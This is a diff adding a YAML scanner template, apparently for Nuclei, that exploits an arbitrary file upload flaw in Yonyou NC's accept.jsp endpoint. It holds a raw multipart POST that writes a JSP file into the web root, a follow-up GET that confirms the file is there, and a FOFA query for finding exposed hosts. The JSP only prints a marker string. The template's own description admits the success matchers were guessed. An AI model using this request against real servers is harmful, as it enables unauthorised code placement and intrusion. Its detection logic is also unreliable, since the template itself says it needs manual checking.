@@ -1,0 +1,65 @@
+id: poc-f2f7c76fc620bb477bcf
+info:
+  name: 用友NCaccept存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/f2f7c76fc620bb477bcf96b37beca301
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: f2f7c76fc620bb477bcf96b37beca301
+    fofa: + huiter：`app.name=="用友 UAP"`
+http:
+- raw:
+  - 'POST /aim/equipmap/accept.jsp HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
+
+    Content-Type: multipart/form-data; boundary=00content0boundary00
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Content-Length: 263
+
+    Connection: close
+
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="file"; filename="stc.txt"
+
+
+    <% out.println("435352Els1K9wZvOlSsdsdmrg"); %>
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="fname"
+
+
+    \webapps\nc_web\stc.jsp
+
+    --00content0boundary00--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /stc.jsp HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
